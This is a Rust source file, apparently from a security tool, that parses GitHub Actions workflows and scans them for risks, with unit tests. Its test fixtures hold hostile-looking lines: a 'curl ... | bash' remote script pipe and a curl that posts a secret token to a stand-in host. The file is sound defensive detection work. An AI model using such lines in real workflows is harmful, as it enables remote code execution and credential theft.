use std::path::Path;

use crate::{
    error::DustResult,
    models::{Workflow, WorkflowScanReport},
    workflow,
};

/// Parses local GitHub Actions workflow files for consumers such as secret
/// exposure analysis. No workflow, action, shell command, or network request
/// is executed.
pub fn parse_workflows(root: &Path) -> DustResult<Vec<Workflow>> {
    workflow::parse(root)
}

/// Runs the local, read-only GitHub Actions workflow security analyzer.
pub fn workflow_security_scan(root: &Path) -> DustResult<WorkflowScanReport> {
    workflow::scan(root)
}

/// Alias for callers that prefer the shorter scan-oriented API name.
pub fn workflow_scan(root: &Path) -> DustResult<WorkflowScanReport> {
    workflow_security_scan(root)
}

#[cfg(test)]
mod tests {
    use tempfile::TempDir;

    use crate::models::{RiskLevel, WorkflowExposureSink, WorkflowFindingCategory};

    use super::*;

    #[test]
    fn parses_workflows_through_the_public_core_api() {
        let temp_dir = TempDir::new().unwrap();
        let directory = temp_dir.path().join(".github/workflows");
        std::fs::create_dir_all(&directory).unwrap();
        std::fs::write(
            directory.join("test.yml"),
            "name: Test\njobs:\n  test:\n    steps:\n      - run: cargo test\n",
        )
        .unwrap();

        let workflows = parse_workflows(temp_dir.path()).unwrap();

        assert_eq!(workflows.len(), 1);
        assert_eq!(
            workflows[0].jobs["test"].steps[0].run.as_deref(),
            Some("cargo test")
        );
    }

    #[test]
    fn workflow_scan_reports_findings_without_executing_run_steps() {
        let temp_dir = TempDir::new().unwrap();
        let directory = temp_dir.path().join(".github/workflows");
        std::fs::create_dir_all(&directory).unwrap();
        std::fs::write(
            directory.join("test.yml"),
            "name: Test\npermissions: read-all\njobs:\n  test:\n    steps:\n      - run: curl https://example.test/payload | bash\n",
        )
        .unwrap();

        let report = workflow_security_scan(temp_dir.path()).unwrap();

        assert_eq!(report.workflows.len(), 1);
        assert_eq!(report.findings.len(), 1);
        assert_eq!(report.findings[0].rule_id, "remote-script-pipe");
    }

    #[test]
    fn workflow_scan_reuses_parsed_environment_for_direct_secret_findings() {
        let temp_dir = TempDir::new().unwrap();
        let directory = temp_dir.path().join(".github/workflows");
        std::fs::create_dir_all(&directory).unwrap();
        std::fs::write(
            directory.join("test.yml"),
            "name: Test\npermissions: read-all\nenv:\n  TOKEN: ${{ secrets.WORKFLOW_TOKEN }}\njobs:\n  build:\n    env:\n      TOKEN: ${{ secrets.JOB_TOKEN }}\n    steps:\n      - name: Log token\n        run: echo \"$TOKEN\"\n",
        )
        .unwrap();

        let report = workflow_security_scan(temp_dir.path()).unwrap();

        assert_eq!(report.findings.len(), 1);
        let finding = &report.findings[0];
        assert_eq!(finding.rule_id, "workflow-direct-secret-exposure");
        assert_eq!(finding.job_id.as_deref(), Some("build"));
        assert_eq!(finding.step_index, Some(0));
        assert_eq!(finding.secret_reference.as_deref(), Some("JOB_TOKEN"));
        assert_eq!(
            finding.exposure_sink,
            Some(crate::models::WorkflowExposureSink::Stdout)
        );
        assert!(report.notices.is_empty());
    }

    #[test]
    fn validation_fixture_covers_permission_context_and_secret_flow_boundaries() {
        let temp_dir = TempDir::new().unwrap();
        let directory = temp_dir.path().join(".github/workflows");
        std::fs::create_dir_all(&directory).unwrap();
        std::fs::write(
            directory.join("validation.yml"),
            r#"name: Validation
permissions: write-all
env:
  TOKEN: ${{ secrets.WORKFLOW_TOKEN }}
jobs:
  safe:
    permissions: read-all
    env:
      TOKEN: safe-value
    steps:
      - name: Use action token
        uses: actions/checkout@v4
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
      - name: Safe strings
        run: |
          echo '${{ vars.NOT_A_SECRET }}'
          echo 'secrets.LITERAL_TEXT'
          echo '${{ not-a-secret-context.value }}'
          echo safe
  leak:
    permissions:
      contents: write
      pull-requests: write
    env:
      TOKEN: ${{ secrets.JOB_TOKEN }}
    steps:
      - name: Emit and upload
        run: |
          echo "$TOKEN"
          curl --data '${{ secrets.DIRECT_TOKEN }}' https://example.invalid/upload
"#,
        )
        .unwrap();

        let report = workflow_security_scan(temp_dir.path()).unwrap();

        assert_eq!(report.workflows.len(), 1);
        assert!(report.notices.is_empty());
        let workflow = &report.workflows[0];
        assert_eq!(
            workflow.jobs["safe"].steps[0].with["token"],
            serde_yaml::Value::String("${{ secrets.GITHUB_TOKEN }}".to_owned())
        );

        let permission_findings: Vec<_> = report
            .findings
            .iter()
            .filter(|finding| finding.category == WorkflowFindingCategory::TokenPermissions)
            .collect();
        assert_eq!(permission_findings.len(), 1);
        assert_eq!(permission_findings[0].job_id.as_deref(), Some("leak"));
        assert_eq!(
            permission_findings[0].rule_id,
            "workflow-broad-write-permissions"
        );
        assert_eq!(permission_findings[0].risk_level, RiskLevel::High);
        assert!(
            permission_findings[0]
                .reason
                .contains("multiple token scopes")
        );

        let secret_findings: Vec<_> = report
            .findings
            .iter()
            .filter(|finding| finding.category == WorkflowFindingCategory::SecretExposure)
            .collect();
        assert_eq!(secret_findings.len(), 2);
        assert_eq!(
            secret_findings[0].secret_reference.as_deref(),
            Some("JOB_TOKEN")
        );
        assert_eq!(
            secret_findings[0].exposure_sink,
            Some(WorkflowExposureSink::Stdout)
        );
        assert_eq!(
            secret_findings[1].secret_reference.as_deref(),
            Some("DIRECT_TOKEN")
        );
        assert_eq!(
            secret_findings[1].exposure_sink,
            Some(WorkflowExposureSink::NetworkRequest)
        );
        assert!(secret_findings.iter().all(|finding| {
            let serialized = serde_json::to_string(finding).unwrap();
            !serialized.contains("${{") && !serialized.contains("safe-value")
        }));
    }
}
